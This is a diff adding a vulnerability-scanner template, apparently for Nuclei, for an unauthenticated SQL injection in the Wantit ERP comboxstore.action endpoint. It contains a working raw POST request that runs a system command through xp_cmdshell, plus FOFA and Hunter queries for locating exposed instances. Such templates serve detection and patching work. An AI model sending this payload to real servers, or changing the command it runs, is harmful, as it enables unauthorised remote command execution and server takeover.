@@ -1,0 +1,32 @@
+id: wantit-erp-comboxstore-action-rce
+
+info:
+  name: wantit-erp-comboxstore-action-rce
+  author: hufei
+  severity: high
+  description: |
+     由于企望制造 ERP comboxstore.action接口权限设置不当，默认的配置可执行任意SQL语句，利用xp_cmdshell函数可远程执行命令，未经认证的攻击者可通过该漏洞获取服务器权限。
+  reference:
+    https://blog.csdn.net/qq_41904294/article/details/132282200
+  metadata:
+    max-request: 1
+    fofa-query: title="企望制造ERP系统"
+    hunter-query: web.title="企望制造ERP系统"
+    verified: true
+  tags: wantit-erp,sqli,rce
+
+http:
+  - raw:
+      - |
+        POST /mainFunctions/comboxstore.action HTTP/1.1
+        Content-Type: application/x-www-form-urlencoded
+        Host: {{Hostname}}
+
+        comboxsql=exec%20xp_cmdshell%20'ver'
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200 && contains(body, 'Windows')"
+          - "status_code == 200 && contains(body, 'Item')"
+        condition: and
